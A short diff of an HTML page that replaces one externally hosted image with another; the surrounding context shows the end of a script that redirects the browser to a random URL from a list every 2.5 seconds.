@@ -11,5 +11,4 @@ window.location = urls[Math.floor(urls.length*Math.random())];
 }
 var temp = setInterval("redirect()", 2500);
 </script>
-
-<img src="http://s22.postimg.org/y5hvjxwyo/0e648d54f147f0f04977cc330553fb04.jpg" alt="0e648d54f147f0f04977cc330553fb04" height="1856px" width="1280px">
+<img src="http://s21.postimg.org/klh1yyzg7/f2a20474ecd2a44a94868802efb74e34.jpg" alt="f2a20474ecd2a44a94868802efb74e34" height="930px" width="620px">
